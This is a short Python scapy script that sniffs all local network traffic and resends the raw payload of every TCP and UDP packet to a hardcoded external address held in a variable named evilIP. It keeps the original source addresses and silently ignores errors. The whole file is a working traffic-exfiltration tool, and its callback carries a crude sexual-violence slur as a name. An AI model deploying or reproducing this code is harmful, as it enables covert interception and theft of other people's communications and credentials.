#!/usr/bin/env python

__year__    = '2015'
__author__  = 'subinacls'
__project__ = 'vacuumpot'

from scapy.all import *
import time

def inthe():
    sniff(prn=rape)

def rape(peyes):
    evilIP = "198.58.112.176"
    try:
        if peyes[IP].src == evilIP:
            pass
        else:
            if peyes.haslayer(TCP):
                if peyes.haslayer(Raw):
                    b = IP(frag=0, src=peyes[IP].src, dst=evilIP)\
                        /TCP(sport=peyes[TCP].sport, dport=peyes[TCP].dport)\
                        /Raw(load=peyes[Raw].load)
                    b.chksum = None
                    send(b,count=1)

            if peyes.haslayer(UDP):
                if peyes.haslayer(Raw):
                    b = IP(src=peyes[IP].src, dst=evilIP)\
                        /UDP(sport=peyes[UDP].sport, dport=peyes[UDP].dport)\
                        /Raw(load=peyes[Raw].load)
                    send(b)

    except Exception as failproto:
        pass
